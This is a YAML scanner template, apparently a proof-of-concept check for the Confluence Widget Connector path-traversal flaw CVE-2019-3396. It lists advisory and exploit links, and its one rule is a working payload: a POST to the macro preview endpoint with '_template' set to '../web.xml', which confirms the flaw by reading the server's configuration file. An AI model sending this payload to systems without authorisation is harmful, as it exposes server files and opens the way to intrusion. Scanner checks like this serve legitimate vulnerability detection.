name: yaml-poc-atlassian-confluence-directory_traversal-CVE-2019-3396
binding: 65646285-b3d0-49ef-96d0-3353d190e360
detail:
    author: system_user
    links:
        - http/confluence_widget_connector
        - http://packetstormsecurity.com/files/152568/Atlassian-Confluence-Widget-Connector-Macro-Velocity-Template-Injection.html
        - http://packetstormsecurity.com/files/161065/Atlassian-Confluence-6.12.1-Template-Injection.html
        - http://seclists.org/bugtraq/2019/Mar/40
        - http://www.rapid7.com/db/modules/exploit/multi/
        - http://www.rapid7.com/db/modules/exploit/multi/http/confluence_widget_connector
        - http://www.securityfocus.com/bid/107543
        - https://confluence.atlassian.com/display/DOC/Confluence
        - https://cxsecurity.com/issue/WLB-2021010158
        - https://jira.atlassian.com/browse/CONFSERVER-57974
        - https://nvd.nist.gov/vuln/detail/CVE-2019-3396
        - https://packetstormsecurity.com/files/152211/Atlassian-Confluence-SSRF-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/152568/Atlassian-Confluence-Widget-Connector-Macro-Velocity-Template-Injection.html
        - https://packetstormsecurity.com/files/161065/Atlassian-Confluence-6.12.1-Template-Injection.html
        - https://www.auscert.org.au/bulletins/77774
        - https://www.exploit-db.com/exploits/46731
        - https://www.exploit-db.com/exploits/46731/
        - https://www.exploit-db.com/exploits/49465
    vulnerability:
        id: 5df23b4e-8966-42b3-a9bb-303b20ba3db4
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /rest/tinymce/1/macro/preview
            headers:
                Content-Type: application/json
            body: |
                {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}
        expression: response.body.bcontains(b"<display-name>Confluence</display-name>") && response.body.bcontains(b"<param-name>contextConfigLocation</param-name>")
expression: r0()
